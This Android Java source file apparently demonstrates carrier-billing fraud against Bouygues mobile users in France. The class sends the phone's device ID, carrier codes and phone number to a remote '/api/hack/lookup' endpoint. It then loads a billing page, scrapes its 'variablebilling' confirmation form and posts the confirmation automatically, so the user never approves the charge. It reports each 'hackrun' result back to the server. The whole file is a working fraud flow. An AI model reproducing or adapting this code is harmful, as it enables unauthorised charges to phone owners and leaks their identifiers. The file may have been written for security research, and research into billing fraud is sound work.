package com.dcbsecure.demo201503.dcbsecure.flow;

import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;

import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
import com.dcbsecure.demo201503.dcbsecure.util.PayUtil;
import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
import com.dcbsecure.demo201503.dcbsecure.managers.TrackMgr;
import com.loopj.android.http.PersistentCookieStore;
import com.loopj.android.http.RequestParams;
import com.loopj.android.http.SyncHttpClient;
import com.loopj.android.http.TextHttpResponseHandler;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.ProtocolException;
import org.apache.http.impl.client.DefaultRedirectHandler;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HttpContext;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class FlowFRBouygues3G implements View.OnClickListener
{
    private final ActivityMainWindow activityMainWindow;

    public FlowFRBouygues3G(ActivityMainWindow activityMainWindow)
    {
        this.activityMainWindow = activityMainWindow;
    }

    @Override
    public void onClick(View v)
    {
        onClick();
    }

    public void onClick()
    {
        Log.d("FLIRTY", "Started handling payment over 3G");


        final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);

        // used to dismiss the progress dialog
        final Handler handler = new Handler()
        {
            @Override
            public void handleMessage(final Message msg)
            {
                super.handleMessage(msg);
            }
        };

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                long runid = 0;
                try
                {
                    TelephonyManager tm = (TelephonyManager) activityMainWindow.getSystemService(Context.TELEPHONY_SERVICE);
                    String iso3166 = tm.getSimCountryIso();
                    if(iso3166==null||iso3166.isEmpty()) iso3166 = tm.getNetworkCountryIso();
                    String mccmnc = tm.getSimOperator();
                    if(mccmnc==null||mccmnc.isEmpty()) mccmnc = tm.getNetworkOperator();
                    String carrier = tm.getSimOperatorName();
                    if(carrier==null||carrier.isEmpty()) carrier = tm.getNetworkOperatorName();

                    //recheck hack data
                    ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("deviceid", deviceid));
                    params.add(new BasicNameValuePair("iso3166", iso3166));
                    params.add(new BasicNameValuePair("mccmnc", mccmnc));
                    params.add(new BasicNameValuePair("carrier", carrier));
                    long msisdn = ConfigMgr.lookupMsisdnFromTelephonyMgr(activityMainWindow);
                    if(msisdn>0) params.add(new BasicNameValuePair("msisdn", ""+msisdn));

                    params.add(new BasicNameValuePair("wifi", PayUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));

                    String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent);
                    if (hackConfigResponse == null)
                    {
                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true, "hack could not read config", "deviceid:" + deviceid);
                        handler.sendEmptyMessage(0);
                    }
                    else
                    {
                        //decode runid first so that if there is an exception later on, we can still report it against the right runid
                        runid = hackConfigResponse.getLong("runid");
                        runFlowNotInMainThread(hackConfigResponse, deviceid, runid, handler);
                    }
                }
                catch (JSONException e)
                {
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, "Could not read hack config", "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
                    Log.d("FLIRTY", "Could not read hack config");
                    handler.sendEmptyMessage(0);
                }
                catch (Exception e)
                {
                    String stack = TrackMgr.getStackAsString(e);
                    String message = "unexpected exception deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow);
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, message, stack);
                    Log.d("FLIRTY", message + " exception:" + e.getClass().getName() + " " + e.getMessage());
                    handler.sendEmptyMessage(0);
                }

            }
        }).start();

    }

    private void runFlowNotInMainThread(JSONObject hackConfig, final String deviceid, final long runid, final Handler handler)
    {
        final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);

        String startUrl;
        try
        {
            startUrl = hackConfig.getString("start_url")+"&tx=1";
        }
        catch (JSONException e)
        {
            String subject = "exception reading json flow config";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject,null);
            handler.sendEmptyMessage(0);
            return;
        }


        activityMainWindow.updateLogs("\nAccessing content page : " + startUrl);
        final RequestResult resultAfterStart = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl, userAgent);
        String htmlDataConfirm = resultAfterStart!=null?resultAfterStart.getContent():null;

        String confirmUrl = null;
        if(resultAfterStart!=null){
            Pattern pattern = Pattern.compile("<form method=\"POST\" action=\"(.*/variablebilling.*)\"><input type=\"hidden\" name=\"ok\"");
            Matcher matcher = pattern.matcher(htmlDataConfirm);
            boolean matchFound = matcher.find();

            if(matchFound){
                Log.d("FLIRTY", "FOUND");
                activityMainWindow.updateLogs("Confirmation form found");
                confirmUrl = matcher.group(1);
            }
        }

        if(resultAfterStart==null)
        {
            String subject = "start_url returns nothing";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, startUrl);
            handler.sendEmptyMessage(0);
            return;
        }
        else if(resultAfterStart.getHttpCode()!=200)
        {
            String subject = "start_url returns http code "+resultAfterStart.getHttpCode()+" "+resultAfterStart.getUrl();
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, resultAfterStart.getContent());
            handler.sendEmptyMessage(0);
            return;
        }
        else if(confirmUrl==null)
        {
            String subject = "cannot workout confirmUrl";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataConfirm);
            handler.sendEmptyMessage(0); //kill the waiting message
            return;
        }
        else if(!htmlDataConfirm.contains("Confirmer"))
        {
            String subject = "expected confirm page does not look right";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataConfirm);
            handler.sendEmptyMessage(0); //kill the waiting message
            return;
        }
        else //if contains "Confirmer"
        {
            activityMainWindow.updateLogs("Calling payment page : " + confirmUrl);
            final ArrayList<NameValuePair> paramsForConfirm = new ArrayList();
            paramsForConfirm.add(new BasicNameValuePair("ok", "OK"));

            // Here we have to make one last POST request to confirm
            final RequestResult resultAfterConfirm = SyncRequestUtil.doSynchronousHttpPost(confirmUrl, paramsForConfirm,userAgent);
            final String successfulConfirmationUrl = resultAfterConfirm!=null?resultAfterConfirm.getUrl():null;
            final String htmlDataAfterConfirm = resultAfterConfirm!=null?resultAfterConfirm.getContent():null;

            if(resultAfterConfirm==null)
            {
                String subject = "Confirm returns null (url:"+confirmUrl+")";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataConfirm);
                handler.sendEmptyMessage(0);
                return;
            }
            else if(resultAfterConfirm.getHttpCode()!=200)
            {
                String subject = "Confirm returns http code "+resultAfterConfirm.getHttpCode();
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
                handler.sendEmptyMessage(0);
                return;
            }
            else if(successfulConfirmationUrl!=null && successfulConfirmationUrl.contains("google.fr"))
            {
                activityMainWindow.updateLogs("\nPayment success !");
                String subject = "successful signup on 3G flow";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterConfirm);
            }
            else
            {
                activityMainWindow.updateLogs("\nPayment success !");
                //post warning
                String subject = "successful signup on 3G flow but wrong redirect after SuccessfulConfirmation.aspx ("+successfulConfirmationUrl+")";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, htmlDataAfterConfirm);
            }
            handler.sendEmptyMessage(0);
            return;
       }

    }

    private RequestResult doSynchronousHttpGetCallReturnsString(ActivityMainWindow activityMainWindow, String startUrl, String userAgent)
    {
        final String[] currentUrl = new String[1];
        SyncHttpClient client = new SyncHttpClient();

        client.setMaxRetriesAndTimeout(3, 5000);

        client.setRedirectHandler(new DefaultRedirectHandler() {
            @Override
            public boolean isRedirectRequested(HttpResponse httpResponse, HttpContext httpContext) {
                return super.isRedirectRequested(httpResponse, httpContext);
            }

            @Override
            public URI getLocationURI(HttpResponse httpResponse, HttpContext httpContext) throws ProtocolException
            {
                Log.d("FLIRTY", Arrays.toString(httpResponse.getHeaders("Location")));

                Header location = httpResponse.getFirstHeader("Location");

                currentUrl[0] = location.getValue();
                try {
                    String noWhiteSpaceLocation = currentUrl[0].replaceAll("\\s", "");
                    if (!currentUrl[0].equals(noWhiteSpaceLocation)) {
                        Log.d("FLIRTY", "fixed redirect location (was:" + currentUrl[0] + ", now:" + noWhiteSpaceLocation + ")");
                        return new URI(noWhiteSpaceLocation);
                    }
                }
                catch (URISyntaxException e) {
                    Log.d("FLIRTY", e.getMessage());
                }

                //default
                return super.getLocationURI(httpResponse,httpContext);
            }
        });

        client.setUserAgent(userAgent);

        PersistentCookieStore myCookieStore = new PersistentCookieStore(activityMainWindow);
        client.setCookieStore(myCookieStore);

        RequestParams params = new RequestParams();
        final RequestResult[] result = {null};
        client.get(activityMainWindow, startUrl, params, new TextHttpResponseHandler()
        {
            @Override
            public void onFailure(int statusCode, Header[] headers, String errorResponse, Throwable e)
            {

                String content;
                if (e.getCause() != null) content = e.getCause().getMessage();
                else content = e.getMessage();
                result[0] = new RequestResult(content, statusCode, currentUrl[0]);
            }

            @Override
            public void onSuccess(int statusCode, Header[] headers, String response)
            {
                result[0] = new RequestResult(response, statusCode, currentUrl[0]);

            }
        });

        return result[0];
    }

    static ArrayList<NameValuePair> buildArrayListParamsOfHiddenFields(String[] lines)
    {
        ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();

        for (int i = 0; i < lines.length; i++)
        {

            if (lines[i].contains("input type=\"hidden\""))
            {
                String hiddenFieldValue = lines[i].substring(lines[i].indexOf("value=\""), lines[i].length());
                hiddenFieldValue = hiddenFieldValue.replace("value=\"", "");
                hiddenFieldValue = hiddenFieldValue.substring(0, hiddenFieldValue.indexOf("\""));

                String hiddenFieldName = lines[i].substring(lines[i].indexOf("name=\""), lines[i].length());
                hiddenFieldName = hiddenFieldName.replace("name=\"", "");
                hiddenFieldName = hiddenFieldName.substring(0, hiddenFieldName.indexOf("\""));

                params.add(new BasicNameValuePair(hiddenFieldName, hiddenFieldValue));
            }

        }

        return params;
    }


}
